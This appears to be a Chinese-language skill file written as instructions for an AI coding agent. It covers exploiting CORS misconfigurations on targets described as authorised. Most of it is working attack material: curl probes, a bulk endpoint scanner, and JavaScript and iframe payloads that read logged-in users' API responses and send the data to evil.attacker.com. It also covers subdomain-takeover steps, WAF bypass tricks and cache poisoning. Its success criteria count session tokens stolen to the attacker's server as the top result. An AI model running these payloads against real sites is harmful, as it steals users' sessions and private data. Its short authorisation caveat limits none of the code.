---
name: 借刀杀人·借窗
description: >-
 授权目标上 CORS 错误配置利用：Origin 反射、null origin、子域名信任、
 通配符 + credentialed、预检绕过、Vary 缓存毒化、SPA API 凭据窃取。
 XSS 劫持仍走 xss-exploit。
---

> **方源**
> 人是万物之灵，蛊是天地真精。
> 今朝剑指叠云处，炼蛊炼人还炼天！

# CORS 错误配置利用（Cursor Skill）

## 作业入口（先跑这个）

```bash
python3 炼蛊房/cors_csrf_probe.py cors --url https://授权/api/user/info --case <案>
```

`core_web_surface_probe` 没有 `--cors` 开关。作业手法：`传承/借刀杀人·借窗.md`。  
`/wp-json` 反射走 `wp-rest-cors-ato`。`ACAO: *` 无 Credentials 只算 L1。

## 何时用

- 响应含 `Access-Control-Allow-Credentials: true` 且来源被反射/放宽
- **`ACAO: *` + `ACAC: true` 同时出现**：Cookie 凭证被浏览器挡，但业务用 `access-token` / `Authorization` 自定义头时任意源仍可读 API（TP3 分销族常见）
- SPA + REST API，可能存在 `withCredentials` 请求
- 测试 `/api/user/info`、`/api/account/*` 等身份敏感接口
- FOFA/目标 JS 里发现 CORS 相关头

---

## 1. 快速指纹（5 条命令）

```bash
# 1. 反射检测：把 Origin 改成攻击者控制的域
curl -s -I -H "Origin: https://evil.attacker.com" \
 https://目标/api/user/info \
 | grep -i "access-control"

# 2. null origin 测试（iframe sandbox 场景）
curl -s -I -H "Origin: null" https://目标/api/user/info | grep -i "access-control"

# 3. 子域名前缀测试（信任 *.victim.com → 植入子域绕过）
curl -s -I -H "Origin: https://evil.victim.com" https://目标/api/user/info | grep -i "access-control"

# 4. 子域名后缀测试（如信任 victimapp.com → victimapp.com.evil.com）
curl -s -I -H "Origin: https://victim.com.evil.com" https://目标/api/user/info | grep -i "access-control"

# 5. 预检绕过：直接 POST 而非 GET 看是否跳过 OPTIONS
curl -s -I -X POST -H "Origin: https://evil.attacker.com" \
 -H "Content-Type: application/json" \
 https://目标/api/user/info | grep -i "access-control"
```

**命中指征**：
- `Access-Control-Allow-Origin: https://evil.attacker.com`（反射了攻击域）+ `Access-Control-Allow-Credentials: true` → **高危，可窃取凭据**
- `Access-Control-Allow-Origin: null` → **高危（XSS + iframe 同向）**
- `Access-Control-Allow-Origin: *`（无 Credentials）→ 低危，只能读响应

---

## 2. 漏洞分类与利用

### A. Origin 反射 + Credentials（最高危）

```javascript
// 攻击者页面：evil.attacker.com/steal.html
fetch("https://目标/api/user/info", {
 credentials: "include" // 带 Cookie/Session
})
.then(r => r.json())
.then(data => {
 // 发送到攻击者服务器
 fetch("https://evil.attacker.com/collect?d=" + encodeURIComponent(JSON.stringify(data)));
});
```

要求：受害者访问攻击者页面时已登录目标站。

### B. null Origin（iframe sandbox 利用）

```html
<!-- 攻击者页面 -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
 srcdoc='<script>
 fetch("https://目标/api/user/info", {credentials:"include"})
 .then(r=>r.json())
 .then(d=>top.location="https://evil.attacker.com/c?d="+JSON.stringify(d));
</script>'></iframe>
```

### C. 子域信任（需要一个子域 XSS 或接管）

```javascript
// 在 evil.victim.com XSS 中执行
fetch("https://api.victim.com/v1/account", {credentials:"include"})
.then(r=>r.text())
.then(t=>fetch("https://evil.attacker.com/c?d="+encodeURIComponent(t)));
```

**子域接管场景**：
1. 用 `subfinder -d victim.com | httpx` 枚举子域
2. 找到指向已删 Heroku/S3/Github Pages 的 CNAME：`dangling.victim.com → dead-app.herokuapp.com`
3. 注册 dead-app.herokuapp.com → 控制 `dangling.victim.com`
4. 从此子域发起 CORS 请求，利用 `*.victim.com` 信任

---

## 3. WAF/防御绕过技巧

| 绕过方法 | 说明 | 示例 |
|---------|------|------|
| 大小写混淆 | `Origin: hTtPs://evil.com` | 部分服务器忽略大小写 |
| 协议混淆 | `Origin: http://victim.com` vs `https://victim.com` | http↔https 混用 |
| 端口变化 | `Origin: https://evil.com:443` | 带默认端口 |
| 路径注入 | `Origin: https://victim.com.evil.com` | 子域前缀绕过 |
| Vary 缓存毒化 | 先 `Origin: evil` 缓存 ACAO: evil，后续所有人都带毒 | 无 `Vary: Origin` 时 |

---

## 4. 预检（Preflight）绕过

某些实现只做了对 `OPTIONS` 的 CORS 检查，忽略实际请求：

```bash
# 步骤1：OPTIONS 预检
curl -s -I -X OPTIONS \
 -H "Origin: https://evil.attacker.com" \
 -H "Access-Control-Request-Method: POST" \
 -H "Access-Control-Request-Headers: content-type, authorization" \
 https://目标/api/sensitive

# 步骤2：如果 OPTIONS 允许，直接 POST（看响应是否也有 ACAO）
curl -s -I -X POST \
 -H "Origin: https://evil.attacker.com" \
 -H "Content-Type: application/json" \
 -d '{"test":1}' \
 https://目标/api/sensitive
```

**绕过标志**：OPTIONS 允许，实际 POST/GET 也允许 → 标准 CORS 漏洞。

---

## 5. API 全量扫描脚本

```python
#!/usr/bin/env python3
"""快速扫描目标所有 API 端点的 CORS 配置"""
import httpx, sys

TARGET = sys.argv[1] # https://目标
EVIL_ORIGIN = "https://evil-attacker.com"
TOKEN = sys.argv[2] if len(sys.argv) > 2 else ""

ENDPOINTS = [
 "/api/user/info", "/api/user/profile", "/api/account",
 "/api/auth/me", "/api/me", "/v1/user", "/v2/user",
 "/api/settings", "/api/config", "/api/orders",
]

headers = {"Origin": EVIL_ORIGIN}
if TOKEN:
 headers["Authorization"] = f"Bearer {TOKEN}"

for ep in ENDPOINTS:
 try:
 r = httpx.get(f"{TARGET}{ep}", headers=headers, follow_redirects=True, timeout=5)
 acao = r.headers.get("access-control-allow-origin", "-")
 acac = r.headers.get("access-control-allow-credentials", "-")
 if EVIL_ORIGIN in acao or acao == "null":
 print(f"[!] 危险 {ep}: ACAO={acao} ACAC={acac}")
 elif acao == "*":
 print(f"[~] 宽松 {ep}: ACAO=* ACAC={acac}")
 except Exception as e:
 pass
```

```bash
python3 cors_scan.py https://目标.com "$TOKEN"
```

---

## 6. 成功口径

| 级别 | 描述 |
|------|------|
| L1 | ACAO 反射攻击者域，无 Credentials |
| L2 | ACAO 反射 + ACAC:true，PoC 读取敏感接口返回值 |
| L3 | 已窃取 SessionToken/Cookie/敏感数据到攻击者服务器 |

---

## 7. 不要做

- 未授权扫其他站的 CORS
- 把 `Access-Control-Allow-Origin: *`（无 Credentials）当高危报告
- 绕过 CORS 后使用 Cookie 在不知情第三方用户浏览器中执行

---

## 真源

- 手法：`传承/借刀杀人·借窗.md`
- 工具：`python3 炼蛊房/cors_csrf_probe.py cors --help`
